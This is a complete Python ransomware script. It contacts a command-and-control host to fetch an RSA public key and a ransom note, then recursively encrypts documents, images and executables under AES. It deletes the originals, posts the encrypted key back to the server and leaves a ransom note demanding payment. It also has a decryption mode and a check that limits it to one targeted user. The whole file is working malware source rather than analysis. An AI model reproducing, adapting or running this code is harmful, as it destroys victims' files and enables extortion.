#!/usr/bin/python
import Crypto, ast, sys, os, re, base64, getopt
from Crypto.PublicKey import RSA
from Crypto.Cipher import AES
from Crypto import Random

BS = 16
pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS)
unpad = lambda s : s[:-ord(s[len(s)-1:])]

# Contact C2 for Pub Key
def get_pub_key():
    if 'requests' not in sys.modules:
        import requests
    headers = {'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36'}
    res = requests.get('http://online-safety-initiative.cm/pub_key',headers=headers).text
    ofile = open('pub_key','w')
    ofile.write(res)
    ofile.close()

# Contact C2 for Ransom Note
def get_ransom_note():
    import requests
    headers = {'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36'}
    res = requests.get('http://online-safety-initiative.cm/RANSOM_NOTE.txt',headers=headers).text
    ofile = open('RANSOM_NOTE.txt','wb')
    ofile.write(res)
    ofile.close()

# Contact C2 to send RSA Encrypted AES Key
def send_key(enc_key):
    import requests
    data = {'id':base64.b64encode(str(enc_key))}
    headers = {'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36'}
    requests.post('http://online-safety-initiative.cm/key.php',data=data, headers=headers)

# Encrypt generated AES key with Public RSA key
def encryptRSA(aes_key):
    RSApubkey = RSA.importKey(open('pub_key','rb').read())
    enc_aes_key = RSApubkey.encrypt(aes_key,32)
    return enc_aes_key

def computer_is_target():
    import hmac, hashlib
    return hmac.HMAC(
        ';\x01g\x45\xF2!\xFF\x00',
        os.environ.get('USER','not the target'),
        hashlib.sha256).hexdigest() == 'e94cbeaa40c6917cffefa2b24431889a72d8966266ef034f9369596975970663'

# Encrypt Function
def encrypt_files():
    # Verify we are on target computer
    if not computer_is_target():
        return

    # Create random AES Key
    aeskey = Random.new().read(32)

    # Create regex for targeted file extensions
    file_ext = re.compile('\w+\.(txt|rtf|png|jpg|jpeg|bmp|gif|doc|dll|exe|pdf|xls|docx|xlsx)$')

    # List files in current directory
    files = [f for f in os.listdir('.') if os.path.isfile(f)]

    # Iterate through list of files and subdirectories
    for dirpath, subdirs, files in os.walk('.'): # start from current directory
        for file in files:
            if re.match(file_ext,file): # If file contains the targeted extension

                # Work out the full path
                file = os.path.join(dirpath, file)
                print "Encrypting:", file

                # Create iv
                iv = Random.new().read(AES.block_size)

                # Generate Cipher engine
                cipher = AES.new(aeskey, AES.MODE_CBC, iv)

                # Open file to be encrypted
                ifile = open(file,'r').read()
                ifile = pad(ifile)

                # Encrypt file with AES Key + iv
                ofile = open(file+'.ENCRYPTED','wb')
                ofile.write(base64.b64encode(iv + cipher.encrypt(ifile)))
                ofile.close()

                # Delete original file
                os.remove(file)

    # Encrypt AES Key with RSA
    enc_key = encryptRSA(aeskey)


    # Append encrypted key into ransom note and save it to id.txt
    get_ransom_note() # pull ransom note from C2
    ofile = open('RANSOM_NOTE.txt','a')
    ofile.write('\nYour Unique ID is in id.txt. DO NOT DELETE id.txt or files can never be restored!!!\n')
    ofile.close()

    ofile = open('id.txt','w')
    ofile.write(base64.b64encode(str(enc_key))+'\n')
    ofile.close()

    # Delete RSA Pub Key
    os.remove('pub_key')

    # Send Encrypted AES key to C2
    send_key(enc_key)


def decryptRSA(priv_key):
    privkey = RSA.importKey(open(priv_key,'rb').read())
    id_file = open('id.txt','rb').read()
    dec_aes_key = privkey.decrypt(ast.literal_eval(str(base64.b64decode(id_file))))
    return dec_aes_key


def decrypt_file(priv_key):
    # Retrieve AES Key
    aeskey = decryptRSA(priv_key)

    # Regex to identify .ENCRYPTED files
    enc_ext = re.compile('\w+\.\w+\.ENCRYPTED$')

    # List files in current directory
    files = [f for f in os.listdir('.') if os.path.isfile(f)]

    # Iterate through list of files
    for dirpath, subdirs, files in os.walk('.'): # start from current directory
        for file in files:
            if re.match(enc_ext,file): # If file ends with .ENCRYPTED
                file = os.path.join(dirpath, file)
                print "Decrypting:", file

                # Open file to be decrypted
                ifile = open(file,'rb').read()
                ifile = base64.b64decode(ifile)
                iv = ifile[:16]

                # Generate Cipher engine
                cipher = AES.new(aeskey, AES.MODE_CBC, iv)

                # Decrypt file with AES Key + iv
                dec_string = cipher.decrypt(ifile[16:])
                unpad(dec_string)

                # Restore file name by removing .ENCRYPTED extension
                restore_filename = file.replace('.ENCRYPTED','')
                ofile = open(restore_filename,'wb')
                ofile.write(dec_string)
                ofile.close()
                os.remove(file)

if __name__ == "__main__":

    # Check for arguments
    argv = sys.argv[1:]

    # If script is ran with no argument, encrypt files
    if len(argv) == 0:
        get_pub_key()
        encrypt_files()

    opts, args = getopt.getopt(argv, "d:")

    for opt, arg in opts:
        # Check if argument is -d, then decrypt files
        if opt == "-d":
            # Decrypt function requires private key to be passed
            decrypt_file(arg)

